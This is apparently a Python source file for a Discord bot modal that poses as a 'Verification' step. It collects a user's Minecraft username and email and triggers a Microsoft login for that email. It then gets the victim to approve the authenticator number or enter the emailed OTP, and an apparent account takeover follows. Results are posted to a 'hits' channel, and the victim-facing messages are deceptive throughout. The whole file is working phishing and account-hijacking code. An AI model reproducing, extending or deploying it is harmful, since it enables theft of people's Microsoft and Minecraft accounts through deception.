from discord import ui, Embed
import datetime
import discord
import asyncio
import json
import re

from views.buttons.codeSubmit import ButtonViewTwo
from views.buttons.failedOTP import ButtonViewThree
from views.buttons.embedOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession
from views.utils.sendAuth import sendAuth

from views.modals.embeds import embeds

config = json.load(open("config.json", "r+"))

class MyModalOne(ui.Modal):
    def __init__(self):
        super().__init__(title="Verification")
        self.add_item(ui.InputText(label="Minecraft Username", required = True))
        self.add_item(ui.InputText(label="Minecraft Email", required = True))

    async def callback(self, interaction: discord.Interaction) -> None: 
        username = self.children[0].value
        email = self.children[1].value

        # Check if email is valid
        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(email) is None:
            await interaction.response.send_message(
                "❌ Invalid Email. Make sure you entered your email correctly!", 
                ephemeral = True
            )
            return

        await interaction.response.defer(ephemeral=True)

        await interaction.followup.send(
            "⌛ Please wait while we try to verify you...",
            ephemeral = True
        )
        
        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        self.session = getSession()

        # Sends OTP/Auth code
        emailInfo = await sendAuth(self.session, email)
        print(emailInfo)
        
        # Email does not exist (ifExistsResults == 1 can be used as an alternative)
        if "Credentials" not in emailInfo:
            await logs_channel.send(
                embed = Embed(
                    title = f"User | {interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C,                         
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user)
            )

            await interaction.followup.send(
                    embed = Embed(
                    title = embeds["invalid_email"][0],
                    description = embeds["invalid_email"][1],
                    color = 0xFF5C5C
                ),
                ephemeral = True
            )

            return

        # Entropy = Authenticator App number to click in  
        elif "RemoteNgcParams" in emailInfo["Credentials"]:
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
            entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]
                
            await interaction.followup.send(
                embed = Embed(
                    title="Verification",
                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            sucessEmbed = Embed(
                title = f"User | {interaction.user.name}",
                description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
                timestamp = datetime.datetime.now(),
                colour = 0x678DC6,                         
            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}")

            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))

            # Checks every second for the authenticator state
            async def checkCode(flowToken):
                response = await self.session.post(
                    url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers = {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json = {
                        "DeviceCode": flowToken
                    }    
                )
                return response.json()
            
            i = 0
            while i < 60:

                data = await checkCode(device)
                print(data)

                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:

                    failedAuth = embeds["failed_auth"]
                    await interaction.followup.send(
                        embed = Embed(
                            title = failedAuth[0],
                            description = failedAuth[1],
                            colour=0xFF5C5C
                        ),
                        ephemeral = True
                    )

                    await logs_channel.send(
                        embed = Embed(
                            title = f"User | {interaction.user.name} ({interaction.user.id})",
                            description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                            timestamp = datetime.datetime.now(),
                            colour = 0xFF5C5C                  
                        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
                        view = ButtonOptions(interaction.user)
                    )
                    return
                
                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:
                    
                    sucessEmbed = Embed (
                        title = f"User | {interaction.user.name}",
                        description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
                        timestamp = datetime.datetime.now(),
                        colour = 0x79D990,                           
                    ).set_thumbnail(
                        url= f"https://visage.surgeplay.com/full/512/{username}"
                    )

                    await logs_channel.send("**This account is being automaticly secured**")
                    await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))

                    await interaction.followup.send(
                        "⌛ Please allow us to proccess your roles...", ephemeral=True
                    )
                    
                    # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
                    securedAccount = await startSecuringAccount(self.session, email, device) 

                    if not securedAccount:
                        await logs_channel.send(
                            embed = Embed(
                                title = f"User | {interaction.user.name} ({interaction.user.id})",
                                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid email OTP```",
                                timestamp = datetime.datetime.now(),
                                colour = 0xFF5C5C                  
                            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
                            view = ButtonOptions(interaction.user)
                        )
                        return
                    
                    await hits_channel.send("@everyone **Successfully secured an account**")
                    await hits_channel.send(
                        embed = securedAccount["hit_embed"],
                        view = accountInfo(
                            securedAccount["details"]
                        )
                    )
                    return
                
                await asyncio.sleep(1)
                i += 1

            failedAuth = embeds["timeout_auth"]
            await interaction.followup.send(
                    embed = Embed(
                    title = failedAuth[0],
                    description = failedAuth[1],
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await logs_channel.send(
               embed = Embed(
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{username} | {email} | Failed to confirm for Auth```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xDE755B              
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
                view = ButtonOptions(interaction.user)  
            )
            return
        
        elif "FidoParams" in emailInfo["Credentials"]:
            # Account uses a physical security key (FIDO/passkey) as 2FA.
            # We disabled isFidoSupported in sendAuth so this should be rare,
            # but handle it gracefully instead of falling through to "no OTP".
            print("[X] - Account requires FIDO/passkey authentication (not supported)")
            await interaction.followup.send(
                embed=Embed(
                    title="❌ Security Key Required",
                    description="This account uses a physical security key (FIDO/passkey) for 2FA which cannot be processed automatically. Please disable the security key from your Microsoft account first.",
                    colour=0xFF5C5C
                ),
                ephemeral=True
            )
            await logs_channel.send(
                embed=Embed(
                    title=f"User | {interaction.user.name} ({interaction.user.id})",
                    description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO/passkey 2FA not supported```",
                    timestamp=datetime.datetime.now(),
                    colour=0xFF5C5C
                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
                view=ButtonOptions(interaction.user)
            )
            return

        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:

            # Initialize to None so we get a clean error if no proof has otcSent
            verflowtoken = None
            verEmail = None

            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
                if value.get("otcSent"):
                    verflowtoken = value["data"]
                    verEmail = value["display"]
                    break  # Use the first sent proof

            if not verEmail or not verflowtoken:
                print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
                await interaction.followup.send(
                    embed=Embed(
                        title=embeds["failed_otp"][0],
                        description=embeds["failed_otp"][1],
                    ),
                    view=ButtonViewThree(),
                    ephemeral=True
                )
                await logs_channel.send(
                    embed=Embed(
                        title=f"User | {interaction.user.name} ({interaction.user.id})",
                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
                        timestamp=datetime.datetime.now(),
                        colour=0xFF5C5C
                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
                    view=ButtonOptions(interaction.user)
                )
                return

            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {verEmail}")

            await interaction.followup.send(
                embed=Embed(
                    title="Verification",
                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(
                    username = username,
                    email = email,
                    flowtoken = verflowtoken
                ),
                ephemeral = True
            )

            sucessEmbed = Embed (
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
                    timestamp = datetime.datetime.now(),
                    colour = 0x678DC6,                         
            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}")

            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
            return
        
        await logs_channel.send(
            embed = Embed(
                title = f"User | {interaction.user.name} ({interaction.user.id})",
                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
                timestamp = datetime.datetime.now(),
                colour = 0xFF5C5C                  
            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
            view = ButtonOptions(interaction.user)  
        )

        await interaction.followup.send(
            embed = Embed(
                title = embeds["failed_otp"][0],
                description = embeds["failed_otp"][1],
            ),
            view = ButtonViewThree(),
            ephemeral = True
        )
        
        return
